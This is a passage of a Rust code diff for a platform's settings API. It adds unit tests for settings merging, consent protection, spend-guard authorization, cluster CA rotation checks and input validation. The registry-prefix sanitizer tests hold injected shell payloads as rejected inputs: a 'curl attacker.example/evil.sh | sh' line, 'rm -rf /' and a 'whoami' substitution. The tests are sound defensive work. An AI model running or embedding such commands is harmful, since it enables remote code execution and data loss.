@@ -2022,9 +3200,7 @@ async fn generate_join_token(
     // Store the hash in settings
     app_state
         .config_service
-        .update_setting_field(|s| {
-            s.multi_node.join_token_hash = Some(token_hash);
-        })
+        .set_join_token_hash(Some(token_hash))
         .await
         .map_err(|e| {
             error!("Failed to store join token hash: {}", e);
@@ -2078,9 +3254,7 @@ async fn revoke_join_token(
 
     app_state
         .config_service
-        .update_setting_field(|s| {
-            s.multi_node.join_token_hash = None;
-        })
+        .set_join_token_hash(None)
         .await
         .map_err(|e| {
             error!("Failed to revoke join token: {}", e);
@@ -2202,7 +3376,381 @@ async fn refresh_route_table(
 #[cfg(test)]
 mod tests {
     use super::*;
-    use temps_core::{AgentSandboxSettings, AiChatLimitsSettings, AppSettings, ProviderConfig};
+
+    #[test]
+    fn partial_settings_updates_preserve_omitted_fields_and_respect_explicit_values() {
+        let mut current = AppSettings {
+            preview_domain: "apps.example.test".into(),
+            ..Default::default()
+        };
+        current.multi_node.cluster_ca_cert_pem = Some("stored-cert".into());
+        current.multi_node.cluster_ca_key_encrypted = Some("stored-encrypted-key".into());
+        current.multi_node.node_failover_after_secs = Some(120);
+        let mut submitted =
+            serde_json::json!({ "multi_node": { "node_failover_after_secs": null } });
+        fill_omitted_settings(&mut submitted, serde_json::to_value(&current).unwrap());
+        let merged: AppSettings = serde_json::from_value(submitted).unwrap();
+        assert_eq!(merged.preview_domain, "apps.example.test");
+        assert_eq!(
+            merged.multi_node.cluster_ca_cert_pem,
+            current.multi_node.cluster_ca_cert_pem
+        );
+        assert_eq!(
+            merged.multi_node.cluster_ca_key_encrypted,
+            current.multi_node.cluster_ca_key_encrypted
+        );
+        assert_eq!(merged.multi_node.node_failover_after_secs, None);
+
+        let mut supplied = serde_json::json!({ "nested": { "value": false }, "list": [] });
+        fill_omitted_settings(
+            &mut supplied,
+            serde_json::json!({ "nested": { "value": true, "keep": 7 }, "list": [1, 2] }),
+        );
+        assert_eq!(
+            supplied,
+            serde_json::json!({ "nested": { "value": false, "keep": 7 }, "list": [] })
+        );
+    }
+
+    #[test]
+    fn generic_settings_write_cannot_enable_plugin_reporting() {
+        let mut body = serde_json::json!({
+            "preview_domain": "apps.example.test",
+            "plugin_installation_reporting_enabled": true
+        });
+        discard_plugin_reporting_consent(&mut body);
+        assert!(body.get("plugin_installation_reporting_enabled").is_none());
+        let mut incoming: AppSettings = serde_json::from_value(body).expect("settings body");
+        let current = AppSettings::default();
+        incoming.plugin_installation_reporting_enabled =
+            current.plugin_installation_reporting_enabled;
+        assert!(!incoming.plugin_installation_reporting_enabled);
+    }
+    use temps_core::{
+        AgentSandboxSettings, AiChatLimitsSettings, AiWorkspaceFileLimitsSettings, AppSettings,
+        ProviderConfig,
+    };
+
+    #[test]
+    fn general_settings_put_cannot_forge_or_replace_provider_verification() {
+        let mut current = AppSettings::default();
+        current.agent_sandbox.providers.insert(
+            "opencode".into(),
+            ProviderConfig {
+                auth_type: "config_file".into(),
+                credentials_encrypted: Some("encrypted-good".into()),
+                extra: serde_json::json!({ "credential_verified": true, "preserved": 1 }),
+                ..Default::default()
+            },
+        );
+        let mut incoming = AppSettings::default();
+        incoming.agent_sandbox.providers.insert(
+            "opencode".into(),
+            ProviderConfig {
+                auth_type: "api_key".into(),
+                credentials_encrypted: Some("encrypted-bad".into()),
+                extra: serde_json::json!({ "credential_verified": false, "user_setting": 2 }),
+                ..Default::default()
+            },
+        );
+        incoming.agent_sandbox.providers.insert(
+            "new".into(),
+            ProviderConfig {
+                credentials_encrypted: Some("forged".into()),
+                extra: serde_json::json!({ "credential_verified": true }),
+                ..Default::default()
+            },
+        );
+        preserve_provider_credential_proof(&mut incoming, &current);
+        let saved = &incoming.agent_sandbox.providers["opencode"];
+        assert_eq!(
+            saved.credentials_encrypted.as_deref(),
+            Some("encrypted-good")
+        );
+        assert_eq!(saved.auth_type, "config_file");
+        assert_eq!(saved.extra["credential_verified"], true);
+        assert_eq!(saved.extra["user_setting"], 2);
+        let forged = &incoming.agent_sandbox.providers["new"];
+        assert_eq!(forged.credentials_encrypted, None);
+        assert!(forged.extra.get("credential_verified").is_none());
+    }
+
+    fn rotation_test_user(mfa_enabled: bool) -> temps_entities::users::Model {
+        let now = chrono::Utc::now();
+        temps_entities::users::Model {
+            id: 71,
+            name: "CA Rotation Admin".to_string(),
+            email: "ca-rotation@example.com".to_string(),
+            password_hash: None,
+            email_verified: true,
+            email_verification_token: None,
+            email_verification_expires: None,
+            password_reset_token: None,
+            password_reset_expires: None,
+            must_change_password: false,
+            deleted_at: None,
+            mfa_secret: mfa_enabled.then(|| "test-secret".to_string()),
+            mfa_enabled,
+            mfa_recovery_codes: None,
+            oidc_subject: None,
+            oidc_provider_id: None,
+            created_at: now,
+            updated_at: now,
+        }
+    }
+
+    // ── ADR-042 §6.3 review, Finding 2: the bulk-activation money guard ──
+
+    fn guard_principal(role: temps_auth::Role) -> temps_auth::AuthContext {
+        temps_auth::AuthContext::new_session(rotation_test_user(false), role)
+    }
+
+    fn cloud_with_factor(factor: Option<f32>) -> CloudSettings {
+        CloudSettings {
+            telemetry_bulk_anomaly_factor: factor,
+            ..Default::default()
+        }
+    }
+
+    #[test]
+    fn an_anomaly_factor_above_the_ceiling_is_rejected_rather_than_silently_clamped() {
+        // Clamping on read alone would leave the settings page echoing back a
+        // number that is not in force — and lying in the one direction that
+        // costs money, because the operator would believe they had widened the
+        // spend guard when they had not.
+        for absurd in [
+            MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR + 0.5,
+            1_000.0,
+            f32::INFINITY,
+            f32::NAN,
+        ] {
+            let problem = validate_bulk_activation_guards(&cloud_with_factor(Some(absurd)))
+                .expect_err("an out-of-range factor must be refused");
+            assert_eq!(
+                problem.status_code,
+                StatusCode::BAD_REQUEST,
+                "{absurd} must be a 400"
+            );
+            let body = format!("{problem:?}");
+            assert!(body.contains("telemetry_bulk_anomaly_factor"), "{body}");
+            // The operator must learn the range *and* what to do when their
+            // project genuinely needs a wider margin than the ceiling allows.
+            assert!(body.contains("maximum"), "{body}");
+            assert!(body.contains("Cloud telemetry status card"), "{body}");
+        }
+    }
+
+    #[test]
+    fn a_factor_below_the_floor_is_rejected_too_and_the_whole_range_is_accepted() {
+        assert_eq!(
+            validate_bulk_activation_guards(&cloud_with_factor(Some(0.5)))
+                .expect_err("below the floor every project pauses on its first chunk")
+                .status_code,
+            StatusCode::BAD_REQUEST
+        );
+
+        for usable in [
+            None,
+            Some(MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR),
+            Some(temps_core::DEFAULT_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR),
+            Some(MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR),
+        ] {
+            assert!(
+                validate_bulk_activation_guards(&cloud_with_factor(usable)).is_ok(),
+                "{usable:?} is inside the tuning range and must be accepted"
+            );
+        }
+    }
+
+    #[test]
+    fn widening_the_money_guard_needs_an_instance_admin_but_narrowing_does_not() {
+        let previous = BulkActivationGuards::from(&cloud_with_factor(Some(5.0)));
+        let wider = BulkActivationGuards::from(&cloud_with_factor(Some(40.0)));
+        let narrower = BulkActivationGuards::from(&cloud_with_factor(Some(2.0)));
+
+        // A settings:write holder who is not an instance admin may tighten the
+        // guard — an operator watching a bill run away must never have to find
+        // an administrator before they can stop it — but not loosen it.
+        let ordinary = guard_principal(temps_auth::Role::User);
+        assert!(authorize_bulk_activation_guard_change(&ordinary, previous, narrower).is_ok());
+        assert!(authorize_bulk_activation_guard_change(&ordinary, previous, previous).is_ok());
+
+        let refused = authorize_bulk_activation_guard_change(&ordinary, previous, wider)
+            .expect_err("loosening the money guard is an instance-admin action");
+        assert_eq!(refused.status_code, StatusCode::FORBIDDEN);
+        let body = format!("{refused:?}");
+        assert!(body.contains("required_role"), "{body}");
+        assert!(body.contains("requested_anomaly_factor"), "{body}");
+
+        // The bar the operator bulk-activation endpoints already use.
+        for role in [temps_auth::Role::Admin, temps_auth::Role::PlatformAdmin] {
+            assert!(
+                authorize_bulk_activation_guard_change(
+                    &guard_principal(role.clone()),
+                    previous,
+                    wider
+                )
+                .is_ok(),
+                "{role} runs the instance and may widen its own spend guard"
+            );
+        }
+    }
+
+    #[test]
+    fn omitting_the_factor_is_not_treated_as_a_change_let_alone_a_widening() {
+        // The settings PUT replaces the whole document, so a client built before
+        // this field existed sends `None`. `None` and `Some(5.0)` are the same
+        // guard, and refusing every such save with a 403 would break every
+        // unrelated settings write on the instance.
+        let unset = BulkActivationGuards::from(&cloud_with_factor(None));
+        let explicit_default = BulkActivationGuards::from(&cloud_with_factor(Some(
+            temps_core::DEFAULT_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR,
+        )));
+
+        assert_eq!(unset, explicit_default);
+        assert!(authorize_bulk_activation_guard_change(
+            &guard_principal(temps_auth::Role::User),
+            unset,
+            explicit_default
+        )
+        .is_ok());
+    }
+
+    #[test]
+    fn a_guard_change_is_audited_with_both_sides_and_the_direction() {
+        // `SETTINGS_UPDATED` carries no field-level values, so under it alone a
+        // widened spend ceiling is indistinguishable from a display-name change.
+        let event = CloudTelemetryBulkGuardUpdatedAudit {
+            context: AuditContext {
+                user_id: 71,
+                ip_address: Some("127.0.0.1".to_string()),
+                user_agent: "test".to_string(),
+            },
+            previous_anomaly_factor: 5.0,
+            new_anomaly_factor: 40.0,
+            previous_rate_limit_spans_per_sec: Some(5_000),
+            new_rate_limit_spans_per_sec: None,
+            widened_anomaly_factor: true,
+        };
+
+        assert_eq!(
+            AuditOperation::operation_type(&event),
+            "CLOUD_TELEMETRY_BULK_GUARD_UPDATED"
+        );
+        let serialized = AuditOperation::serialize(&event).expect("must serialize");
+        assert!(
+            serialized.contains("\"previous_anomaly_factor\":5.0"),
+            "{serialized}"
+        );
+        assert!(
+            serialized.contains("\"new_anomaly_factor\":40.0"),
+            "{serialized}"
+        );
+        assert!(
+            serialized.contains("\"previous_rate_limit_spans_per_sec\":5000"),
+            "{serialized}"
+        );
+        assert!(
+            serialized.contains("\"new_rate_limit_spans_per_sec\":null"),
+            "{serialized}"
+        );
+        assert!(
+            serialized.contains("\"widened_anomaly_factor\":true"),
+            "{serialized}"
+        );
+    }
+
+    #[test]
+    fn a_throttle_change_alone_is_still_a_recordable_guard_change() {
+        // The rate limit is the other half of what governs how fast a paid-for
+        // activation spends. A change to it with the factor untouched must not
+        // fall through the "did anything change" check.
+        let previous = BulkActivationGuards::from(&CloudSettings {
+            telemetry_bulk_rate_limit_spans_per_sec: Some(1_000),
+            ..Default::default()
+        });
+        let next = BulkActivationGuards::from(&CloudSettings {
+            telemetry_bulk_rate_limit_spans_per_sec: None,
+            ..Default::default()
+        });
+
+        assert_ne!(previous, next);
+        // …and removing a throttle is not a widening of the money guard, so it
+        // stays under ordinary settings:write.
+        assert!(authorize_bulk_activation_guard_change(
+            &guard_principal(temps_auth::Role::User),
+            previous,
+            next
+        )
+        .is_ok());
+    }
+
+    fn disconnected_authorizer() -> temps_auth::DefaultSensitiveActionAuthorizer {
+        temps_auth::DefaultSensitiveActionAuthorizer::new(Arc::new(
+            sea_orm::DatabaseConnection::Disconnected,
+        ))
+    }
+
+    #[tokio::test]
+    async fn cluster_ca_rotation_rejects_machine_credentials_even_with_permission() {
+        let auth = temps_auth::AuthContext::new_api_key(
+            rotation_test_user(true),
+            None,
+            Some(vec![
+                temps_auth::Permission::SettingsWrite,
+                temps_auth::Permission::ClusterCaRotate,
+            ]),
+            "rotation-key".to_string(),
+            19,
+        );
+
+        let error = require_cluster_ca_rotation_authorization(&disconnected_authorizer(), &auth)
+            .await
+            .expect_err("API keys must never rotate the cluster CA");
+        assert_eq!(error.status_code, StatusCode::FORBIDDEN);
+        assert_eq!(
+            error.body.get("error_code"),
+            Some(&serde_json::json!(
+                "CLUSTER_CA_ROTATION_BROWSER_SESSION_REQUIRED"
+            ))
+        );
+    }
+
+    #[tokio::test]
+    async fn cluster_ca_rotation_rejects_platform_administrators() {
+        let auth = temps_auth::AuthContext::new_persisted_session(
+            rotation_test_user(true),
+            temps_auth::Role::PlatformAdmin,
+            24,
+        );
+
+        let error = require_cluster_ca_rotation_authorization(&disconnected_authorizer(), &auth)
+            .await
+            .expect_err("platform administrators must not rotate the cluster CA");
+        assert_eq!(error.status_code, StatusCode::FORBIDDEN);
+        assert_eq!(
+            error.body.get("error_code"),
+            Some(&serde_json::json!("CLUSTER_CA_ROTATION_ADMIN_REQUIRED"))
+        );
+    }
+
+    #[tokio::test]
+    async fn cluster_ca_rotation_requires_mfa_enrollment() {
+        let auth = temps_auth::AuthContext::new_persisted_session(
+            rotation_test_user(false),
+            temps_auth::Role::Admin,
+            23,
+        );
+
+        let error = require_cluster_ca_rotation_authorization(&disconnected_authorizer(), &auth)
+            .await
+            .expect_err("an admin without MFA must not rotate the cluster CA");
+        assert_eq!(error.status_code, StatusCode::FORBIDDEN);
+        assert_eq!(
+            error.body.get("error_code"),
+            Some(&serde_json::json!("CLUSTER_CA_ROTATION_MFA_REQUIRED"))
+        );
+    }
 
     /// An operator's decision to forbid console updates must survive a save
     /// from a client that has never heard of the field.
@@ -2270,6 +3818,267 @@ mod tests {
         assert_eq!(settings.self_update().channel, None);
     }
 
+    #[test]
+    fn omitted_forwarded_ip_trust_preserves_admin_choice() {
+        let current = AppSettings {
+            trust_loopback_forwarded_ip: Some(true),
+            ..AppSettings::default()
+        };
+        let mut incoming: AppSettings = serde_json::from_value(serde_json::json!({}))
+            .expect("an older settings client omits the new field");
+
+        preserve_omitted_security_fields(&mut incoming, &current);
+
+        assert!(incoming.trust_loopback_forwarded_ip());
+    }
+
+    #[test]
+    fn explicit_forwarded_ip_trust_false_disables_admin_choice() {
+        let current = AppSettings {
+            trust_loopback_forwarded_ip: Some(true),
+            ..AppSettings::default()
+        };
+        let mut incoming = AppSettings {
+            trust_loopback_forwarded_ip: Some(false),
+            ..AppSettings::default()
+        };
+
+        preserve_omitted_security_fields(&mut incoming, &current);
+
+        assert!(!incoming.trust_loopback_forwarded_ip());
+        assert!(!AppSettingsResponse::from(incoming).trust_loopback_forwarded_ip);
+    }
+
+    #[test]
+    fn generic_settings_update_cannot_enable_cloud_exports() {
+        let current = AppSettings::default();
+        let mut incoming = AppSettings::default();
+        incoming.cloud.telemetry_enabled = true;
+        incoming.cloud.backups_enabled = true;
+        incoming.cloud.notifications_enabled = true;
+
+        preserve_cloud_settings_not_sent_by_every_client(
+            &mut incoming,
+            &current,
+            CloudFieldsSent::default(),
+        );
+
+        assert!(!incoming.cloud.telemetry_enabled);
+        assert!(!incoming.cloud.backups_enabled);
+        assert!(!incoming.cloud.notifications_enabled);
+    }
+
+    #[test]
+    fn generic_settings_update_preserves_existing_cloud_export_consent() {
+        let mut current = AppSettings::default();
+        current.cloud.telemetry_enabled = true;
+        current.cloud.backups_enabled = true;
+        current.cloud.notifications_enabled = true;
+        let mut incoming = AppSettings::default();
+
+        preserve_cloud_settings_not_sent_by_every_client(
+            &mut incoming,
+            &current,
+            CloudFieldsSent::default(),
+        );
+
+        assert!(incoming.cloud.telemetry_enabled);
+        assert!(incoming.cloud.backups_enabled);
+        assert!(incoming.cloud.notifications_enabled);
+    }
+
+    /// A settings row whose operator-tuned Cloud fields have all been moved off
+    /// their defaults, so that "reset to default" is visible as a failure.
+    fn stored_settings_with_tuned_cloud_fields() -> AppSettings {
+        let mut current = AppSettings::default();
+        // ADR-041: a bigger outbox than the 512 MiB default, and a Cloud that
+        // is not the production one.
+        current.cloud.backend_url = "https://cloud.staging.example".to_string();
+        current.cloud.telemetry_outbox_max_bytes = 1024 * 1024 * 1024;
+        // ADR-042: a narrowed spend guard and a throttled backfill.
+        current.cloud.telemetry_bulk_anomaly_factor = Some(2.0);
+        current.cloud.telemetry_bulk_rate_limit_spans_per_sec = Some(5_000);
+        current
+    }
+
+    /// Mirror exactly what `update_settings` does with a request body: read key
+    /// presence off the raw JSON, deserialize, then merge the stored `cloud`
+    /// block in. Testing from the wire format is the point — the bug being
+    /// guarded against lives in the gap between "key absent" and "value equals
+    /// the default", which no test built from an `AppSettings` value could see.
+    fn merge_settings_body(body: serde_json::Value, current: &AppSettings) -> AppSettings {
+        let sent = CloudFieldsSent::from_settings_body(&body);
+        let mut incoming: AppSettings =
+            serde_json::from_value(body).expect("settings body should deserialize");
+        preserve_cloud_settings_not_sent_by_every_client(&mut incoming, current, sent);
+        incoming
+    }
+
+    /// The console's own save has never carried a `cloud` block, and no client
+    /// built before ADR-041/ADR-042 does either. Such a save must leave every
+    /// operator-tuned Cloud field exactly as stored, not reset it to the
+    /// build-time default.
+    #[test]
+    fn a_settings_save_that_omits_the_cloud_block_keeps_the_stored_spend_guards() {
+        let current = stored_settings_with_tuned_cloud_fields();
+
+        // A realistic unrelated save: some other settings page, no `cloud` key.
+        let merged = merge_settings_body(
+            serde_json::json!({
+                "preview_domain": "apps.example.test",
+                "insecure_tls": false,
+            }),
+            &current,
+        );
+
+        // ADR-042 §6.3 — the narrowed money guard survives.
+        assert_eq!(merged.cloud.telemetry_bulk_anomaly_factor, Some(2.0));
+        assert_eq!(merged.cloud.effective_bulk_anomaly_factor(), 2.0);
+        assert_ne!(
+            merged.cloud.effective_bulk_anomaly_factor(),
+            temps_core::DEFAULT_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR
+        );
+        // ADR-042 §3 — the throttle survives.
+        assert_eq!(
+            merged.cloud.telemetry_bulk_rate_limit_spans_per_sec,
+            Some(5_000)
+        );
+        // ADR-041 — the outbox ceiling and the Cloud destination survive.
+        assert_eq!(merged.cloud.telemetry_outbox_max_bytes, 1024 * 1024 * 1024);
+        assert_eq!(merged.cloud.backend_url, "https://cloud.staging.example");
+    }
+
+    /// The same save must also not *look* like a guard change, or an operator
+    /// holding only `settings:write` would be refused with a 403 (widening 2x
+    /// back to the 5x default is instance-admin only) and the audit log would
+    /// record a spend-guard change that nobody made.
+    #[test]
+    fn a_settings_save_that_omits_the_cloud_block_is_not_a_guard_change() {
+        let current = stored_settings_with_tuned_cloud_fields();
+
+        let merged = merge_settings_body(
+            serde_json::json!({ "preview_domain": "apps.example.test" }),
+            &current,
+        );
+
+        assert_eq!(
+            BulkActivationGuards::from(&merged.cloud),
+            BulkActivationGuards::from(&current.cloud)
+        );
+    }
+
+    /// Preserving is not freezing: a client that names a field still writes it,
+    /// including writing it *back to its default value* — the case a
+    /// "value equals the default means absent" heuristic would silently drop.
+    #[test]
+    fn an_explicitly_sent_cloud_field_still_overrides_the_stored_one() {
+        let current = stored_settings_with_tuned_cloud_fields();
+
+        let merged = merge_settings_body(
+            serde_json::json!({
+                "cloud": {
+                    "telemetry_bulk_anomaly_factor": 7.5,
+                    "backend_url": "https://app.temps.sh",
+                }
+            }),
+            &current,
+        );
+
+        assert_eq!(merged.cloud.telemetry_bulk_anomaly_factor, Some(7.5));
+        // Explicitly restoring the default destination is a real write.
+        assert_eq!(merged.cloud.backend_url, "https://app.temps.sh");
+        // The two keys this body did not name are still preserved.
+        assert_eq!(
+            merged.cloud.telemetry_bulk_rate_limit_spans_per_sec,
+            Some(5_000)
+        );
+        assert_eq!(merged.cloud.telemetry_outbox_max_bytes, 1024 * 1024 * 1024);
+    }
+
+    /// An explicit `null` is a value, not an omission: it is how a client
+    /// removes the backfill throttle and returns the anomaly factor to the
+    /// documented default.
+    #[test]
+    fn an_explicit_null_clears_a_cloud_field_instead_of_preserving_it() {
+        let current = stored_settings_with_tuned_cloud_fields();
+
+        let merged = merge_settings_body(
+            serde_json::json!({
+                "cloud": {
+                    "telemetry_bulk_rate_limit_spans_per_sec": null,
+                    "telemetry_bulk_anomaly_factor": null,
+                }
+            }),
+            &current,
+        );
+
+        assert_eq!(merged.cloud.telemetry_bulk_rate_limit_spans_per_sec, None);
+        assert_eq!(merged.cloud.telemetry_bulk_anomaly_factor, None);
+        assert_eq!(
+            merged.cloud.effective_bulk_anomaly_factor(),
+            temps_core::DEFAULT_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR
+        );
+        // Still scoped: the unnamed ADR-041 fields are untouched.
+        assert_eq!(merged.cloud.telemetry_outbox_max_bytes, 1024 * 1024 * 1024);
+        assert_eq!(merged.cloud.backend_url, "https://cloud.staging.example");
+    }
+
+    /// `PUT /settings` replaces the whole document, so an absent
+    /// `node_failover_after_secs` must be told apart from an explicit `null`.
+    #[test]
+    fn node_failover_grace_presence_is_read_off_the_wire() {
+        let sent = |body: serde_json::Value| {
+            SettingsWritePresence::from_settings_body(&body).node_failover_after_secs_sent()
+        };
+
+        assert!(!sent(serde_json::json!({})));
+        assert!(!sent(
+            serde_json::json!({ "multi_node": { "require_mtls": true } })
+        ));
+        assert!(!sent(serde_json::json!({ "multi_node": null })));
+        assert!(sent(serde_json::json!({
+            "multi_node": { "node_failover_after_secs": 600 }
+        })));
+
+        // Explicit null = "disable automatic failover": present, with no value.
+        let disabled = SettingsWritePresence::from_settings_body(&serde_json::json!({
+            "multi_node": { "node_failover_after_secs": null }
+        }));
+        assert!(disabled.node_failover_after_secs_sent());
+        assert_eq!(
+            disabled.multi_node.and_then(|m| m.node_failover_after_secs),
+            Some(None)
+        );
+
+        // A body the typed view cannot read reports nothing as sent; the full
+        // `AppSettings` deserialization is what rejects it.
+        assert!(!sent(serde_json::json!({ "multi_node": "not-an-object" })));
+        assert!(!sent(serde_json::json!({
+            "multi_node": { "node_failover_after_secs": "soon" }
+        })));
+    }
+
+    #[test]
+    fn cloud_field_presence_is_read_per_key_from_the_request_body() {
+        let nothing = CloudFieldsSent::from_settings_body(&serde_json::json!({}));
+        assert_eq!(nothing, CloudFieldsSent::default());
+
+        // A `cloud` block that exists but names no operator-tuned field (what a
+        // client that only knows about the consent flags would send).
+        let consent_only = CloudFieldsSent::from_settings_body(&serde_json::json!({
+            "cloud": { "telemetry_enabled": true }
+        }));
+        assert_eq!(consent_only, CloudFieldsSent::default());
+
+        let outbox_only = CloudFieldsSent::from_settings_body(&serde_json::json!({
+            "cloud": { "telemetry_outbox_max_bytes": 1024 }
+        }));
+        assert!(outbox_only.telemetry_outbox_max_bytes);
+        assert!(!outbox_only.backend_url);
+        assert!(!outbox_only.telemetry_bulk_anomaly_factor);
+        assert!(!outbox_only.telemetry_bulk_rate_limit_spans_per_sec);
+    }
+
     /// The stored value and the effective value must be the same number.
     ///
     /// The runtime clamps on read, so an out-of-range value could never break
@@ -2300,6 +4109,42 @@ mod tests {
                 "{ok}s should be accepted"
             );
         }
+    }
+
+    #[test]
+    fn ai_workspace_file_limits_reject_unsafe_or_inconsistent_values() {
+        let oversized = AiWorkspaceFileLimitsSettings {
+            max_image_preview_size_mb: 17,
+            ..AiWorkspaceFileLimitsSettings::default()
+        };
+        assert!(validate_ai_workspace_file_limits(&oversized).is_err());
+
+        let oversized_download = AiWorkspaceFileLimitsSettings {
+            max_download_size_mb: 33,
+            ..AiWorkspaceFileLimitsSettings::default()
+        };
+        assert!(validate_ai_workspace_file_limits(&oversized_download).is_err());
+
+        let inconsistent = AiWorkspaceFileLimitsSettings {
+            max_file_size_mb: 16,
+            max_upload_size_mb: 8,
+            ..AiWorkspaceFileLimitsSettings::default()
+        };
+        assert!(validate_ai_workspace_file_limits(&inconsistent).is_err());
+
+        let preview_exceeds_download = AiWorkspaceFileLimitsSettings {
+            max_image_preview_size_mb: 8,
+            max_download_size_mb: 4,
+            ..AiWorkspaceFileLimitsSettings::default()
+        };
+        assert!(validate_ai_workspace_file_limits(&preview_exceeds_download).is_err());
+    }
+
+    #[test]
+    fn default_ai_workspace_file_limits_are_accepted() {
+        assert!(
+            validate_ai_workspace_file_limits(&AiWorkspaceFileLimitsSettings::default()).is_ok()
+        );
     }
 
     #[test]
@@ -2451,6 +4296,65 @@ mod tests {
     }
 
     #[test]
+    fn sanitize_registry_mirror_prefix_treats_blank_as_unset() {
+        assert_eq!(
+            sanitize_registry_mirror_prefix(Some(String::new())).unwrap(),
+            None
+        );
+        assert_eq!(
+            sanitize_registry_mirror_prefix(Some("   ".to_string())).unwrap(),
+            None
+        );
+        assert_eq!(sanitize_registry_mirror_prefix(None).unwrap(), None);
+    }
+
+    #[test]
+    fn sanitize_registry_mirror_prefix_trims_whitespace_and_trailing_slash() {
+        assert_eq!(
+            sanitize_registry_mirror_prefix(Some("  registry.example.com/docker/ \n".to_string()))
+                .unwrap(),
+            Some("registry.example.com/docker".to_string())
+        );
+    }
+
+    // Regression: the settings API is the boundary where an operator-supplied
+    // prefix must be rejected outright, not silently defused later. Without
+    // this, a prefix containing an embedded newline would be accepted and
+    // stored, and only fail to apply (silently) once a build actually ran.
+    #[test]
+    fn sanitize_registry_mirror_prefix_rejects_embedded_control_characters() {
+        let err = sanitize_registry_mirror_prefix(Some(
+            "registry.example.com\nRUN curl attacker.example/evil.sh | sh".to_string(),
+        ))
+        .unwrap_err();
+        let detail = err.body.get("detail").and_then(|v| v.as_str()).unwrap();
+        assert!(detail.contains("registry_mirror_prefix"));
+    }
+
+    #[test]
+    fn sanitize_registry_mirror_prefix_rejects_shell_metacharacters() {
+        assert!(sanitize_registry_mirror_prefix(Some(
+            "registry.example.com; rm -rf /".to_string()
+        ))
+        .is_err());
+        assert!(
+            sanitize_registry_mirror_prefix(Some("registry.example.com`whoami`".to_string()))
+                .is_err()
+        );
+    }
+
+    #[test]
+    fn sanitize_registry_mirror_prefix_accepts_a_well_formed_prefix() {
+        assert_eq!(
+            sanitize_registry_mirror_prefix(Some(
+                "registry.example.com:5000/team_a/docker-mirror".to_string()
+            ))
+            .unwrap(),
+            Some("registry.example.com:5000/team_a/docker-mirror".to_string())
+        );
+    }
+
+    #[test]
     fn observability_compression_validation_accepts_supported_boundaries() {
         assert!(
             validate_observability_compression(&ObservabilityCompressionSettings {
@@ -2494,6 +4398,7 @@ mod tests {
                 otel_spans_days: 3650,
                 otel_logs_days: 90,
                 otel_metrics_days: 90,
+                container_logs_days: 30,
             })
             .is_ok()
         );
@@ -2506,12 +4411,35 @@ mod tests {
             otel_spans_days: 90,
             otel_logs_days: 0,
             otel_metrics_days: 90,
+            container_logs_days: 30,
         })
         .expect_err("zero-day retention must be rejected");
         assert_eq!(
             error.body.get("detail").and_then(|value| value.as_str()),
             Some("observability_retention.otel_logs_days must be between 1 and 3650")
         );
+    }
+
+    #[test]
+    fn container_log_budgets_are_bounded() {
+        use temps_core::ContainerLogSettings;
+        let ok = ContainerLogSettings::default();
+        assert!(validate_container_log_budgets(&ok).is_ok());
+        let tiny_cache = ContainerLogSettings {
+            cache_mb: 16,
+            ..ContainerLogSettings::default()
+        };
+        assert!(validate_container_log_budgets(&tiny_cache).is_err());
+        let huge_head = ContainerLogSettings {
+            head_buffer_mb: 1024,
+            ..ContainerLogSettings::default()
+        };
+        assert!(validate_container_log_budgets(&huge_head).is_err());
+        let zero_head = ContainerLogSettings {
+            head_buffer_mb: 0,
+            ..ContainerLogSettings::default()
+        };
+        assert!(validate_container_log_budgets(&zero_head).is_err());
     }
 
     // The ClickHouse metrics store is built from TEMPS_CLICKHOUSE_* env
@@ -2721,6 +4649,92 @@ mod tests {
     }
 
     #[test]
+    fn response_surfaces_geo_policy_without_the_license_key() {
+        let now = chrono::Utc::now();
+        let mut settings = AppSettings::default();
+        settings.geo.refresh_interval_hours = Some(6);
+        settings.geo.stale_lookup_days = Some(14);
+        settings.geo.maxmind_license_key = Some("plaintext-key".to_string());
+        settings.geo.maxmind_license_key_encrypted = Some("ciphertext-blob".to_string());
+        settings.geo.source = Some(temps_core::GEO_SOURCE_MAXMIND_OFFICIAL.to_string());
+        settings.geo.last_refreshed_at = Some(now);
+        settings.geo.last_check_at = Some(now);
+        settings.geo.last_check_status = Some(temps_core::GEO_CHECK_STATUS_OK.to_string());
+
+        let response = AppSettingsResponse::from(settings);
+
+        assert_eq!(response.geo.refresh_interval_hours, Some(6));
+        assert_eq!(response.geo.stale_lookup_days, Some(14));
+        assert_eq!(response.geo.effective_refresh_interval_hours, 6);
+        assert_eq!(response.geo.effective_stale_lookup_days, 14);
+        assert!(response.geo.maxmind_license_key_saved);
+        assert_eq!(
+            response.geo.source.as_deref(),
+            Some(temps_core::GEO_SOURCE_MAXMIND_OFFICIAL)
+        );
+        assert!(response.geo.last_refreshed_at.is_some());
+
+        let rendered = serde_json::to_string(&response).expect("serialize the settings response");
+        assert!(
+            !rendered.contains("plaintext-key"),
+            "the settings response must never carry the plaintext license key"
+        );
+        assert!(
+            !rendered.contains("ciphertext-blob"),
+            "the settings response must never carry the stored ciphertext"
+        );
+    }
+
+    #[test]
+    fn response_reports_effective_geo_defaults_when_unconfigured() {
+        let response = AppSettingsResponse::from(AppSettings::default());
+
+        assert_eq!(response.geo.refresh_interval_hours, None);
+        assert_eq!(response.geo.stale_lookup_days, None);
+        assert_eq!(
+            response.geo.effective_refresh_interval_hours,
+            temps_core::DEFAULT_GEO_REFRESH_INTERVAL_HOURS
+        );
+        assert_eq!(
+            response.geo.effective_stale_lookup_days,
+            temps_core::DEFAULT_GEO_STALE_LOOKUP_DAYS
+        );
+        assert!(!response.geo.maxmind_license_key_saved);
+        assert_eq!(response.geo.last_check_status, None);
+    }
+
+    #[test]
+    fn geo_validation_accepts_the_supported_boundaries_and_none() {
+        assert!(validate_geo_settings(&temps_core::GeoSettings::default()).is_ok());
+        assert!(validate_geo_settings(&temps_core::GeoSettings {
+            refresh_interval_hours: Some(temps_core::MIN_GEO_REFRESH_INTERVAL_HOURS),
+            stale_lookup_days: Some(temps_core::MAX_GEO_STALE_LOOKUP_DAYS),
+            ..temps_core::GeoSettings::default()
+        })
+        .is_ok());
+    }
+
+    #[test]
+    fn geo_validation_rejects_a_zero_refresh_interval() {
+        let error = validate_geo_settings(&temps_core::GeoSettings {
